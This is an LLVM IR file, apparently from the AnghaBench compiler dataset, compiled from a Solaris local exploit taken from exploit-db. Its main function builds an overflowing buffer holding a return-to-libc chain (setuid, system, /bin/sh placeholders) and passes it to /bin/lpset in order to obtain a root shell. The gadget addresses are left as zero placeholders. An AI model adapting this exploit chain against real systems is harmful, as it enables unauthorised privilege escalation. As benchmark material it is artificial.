; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19874.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19874.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@STACK = common dso_local global i32 0, align 4
@SCANF = common dso_local global i32 0, align 4
@POP2 = common dso_local global i32 0, align 4
@PERCD = common dso_local global i32 0, align 4
@SETUID = common dso_local global i32 0, align 4
@POP1 = common dso_local global i32 0, align 4
@SYSTEM = common dso_local global i32 0, align 4
@BINSH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"/bin/lpset\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-n\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"fns\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-r\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"123\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1024 x i8], align 16
  %3 = alloca [1 x i8*], align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %7 = load i32, i32* @BUFSIZE, align 4
  %8 = call i32 @memset(i8* %6, i8 signext 97, i32 %7)
  %9 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %10 = load i32, i32* @BUFSIZE, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds i8, i8* %9, i64 %11
  %13 = bitcast i8* %12 to i32*
  store i32* %13, i32** %4, align 8
  %14 = load i32, i32* @STACK, align 4
  %15 = load i32*, i32** %4, align 8
  %16 = getelementptr inbounds i32, i32* %15, i32 1
  store i32* %16, i32** %4, align 8
  store i32 %14, i32* %15, align 4
  %17 = load i32, i32* @SCANF, align 4
  %18 = add nsw i32 %17, 1
  %19 = load i32*, i32** %4, align 8
  %20 = getelementptr inbounds i32, i32* %19, i32 1
  store i32* %20, i32** %4, align 8
  store i32 %18, i32* %19, align 4
  %21 = load i32, i32* @STACK, align 4
  %22 = add nsw i32 %21, 24
  %23 = load i32*, i32** %4, align 8
  %24 = getelementptr inbounds i32, i32* %23, i32 1
  store i32* %24, i32** %4, align 8
  store i32 %22, i32* %23, align 4
  %25 = load i32, i32* @POP2, align 4
  %26 = load i32*, i32** %4, align 8
  %27 = getelementptr inbounds i32, i32* %26, i32 1
  store i32* %27, i32** %4, align 8
  store i32 %25, i32* %26, align 4
  %28 = load i32, i32* @PERCD, align 4
  %29 = load i32*, i32** %4, align 8
  %30 = getelementptr inbounds i32, i32* %29, i32 1
  store i32* %30, i32** %4, align 8
  store i32 %28, i32* %29, align 4
  %31 = load i32, i32* @STACK, align 4
  %32 = add nsw i32 %31, 36
  %33 = load i32*, i32** %4, align 8
  %34 = getelementptr inbounds i32, i32* %33, i32 1
  store i32* %34, i32** %4, align 8
  store i32 %32, i32* %33, align 4
  %35 = load i32, i32* @STACK, align 4
  %36 = add nsw i32 %35, 40
  %37 = load i32*, i32** %4, align 8
  %38 = getelementptr inbounds i32, i32* %37, i32 1
  store i32* %38, i32** %4, align 8
  store i32 %36, i32* %37, align 4
  %39 = load i32, i32* @SETUID, align 4
  %40 = load i32*, i32** %4, align 8
  %41 = getelementptr inbounds i32, i32* %40, i32 1
  store i32* %41, i32** %4, align 8
  store i32 %39, i32* %40, align 4
  %42 = load i32, i32* @POP1, align 4
  %43 = load i32*, i32** %4, align 8
  %44 = getelementptr inbounds i32, i32* %43, i32 1
  store i32* %44, i32** %4, align 8
  store i32 %42, i32* %43, align 4
  %45 = load i32*, i32** %4, align 8
  %46 = getelementptr inbounds i32, i32* %45, i32 1
  store i32* %46, i32** %4, align 8
  store i32 858993459, i32* %45, align 4
  %47 = load i32, i32* @STACK, align 4
  %48 = add nsw i32 %47, 60
  %49 = load i32*, i32** %4, align 8
  %50 = getelementptr inbounds i32, i32* %49, i32 1
  store i32* %50, i32** %4, align 8
  store i32 %48, i32* %49, align 4
  %51 = load i32, i32* @SYSTEM, align 4
  %52 = load i32*, i32** %4, align 8
  %53 = getelementptr inbounds i32, i32* %52, i32 1
  store i32* %53, i32** %4, align 8
  store i32 %51, i32* %52, align 4
  %54 = load i32*, i32** %4, align 8
  %55 = getelementptr inbounds i32, i32* %54, i32 1
  store i32* %55, i32** %4, align 8
  store i32 858993459, i32* %54, align 4
  %56 = load i32, i32* @BINSH, align 4
  %57 = load i32*, i32** %4, align 8
  %58 = getelementptr inbounds i32, i32* %57, i32 1
  store i32* %58, i32** %4, align 8
  store i32 %56, i32* %57, align 4
  %59 = load i32*, i32** %4, align 8
  store i32 0, i32* %59, align 4
  %60 = getelementptr inbounds [1 x i8*], [1 x i8*]* %3, i64 0, i64 0
  store i8* null, i8** %60, align 8
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %62 = getelementptr inbounds [1 x i8*], [1 x i8*]* %3, i64 0, i64 0
  %63 = call i32 @execle(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %61, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 0, i8** %62)
  ret i32 0
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
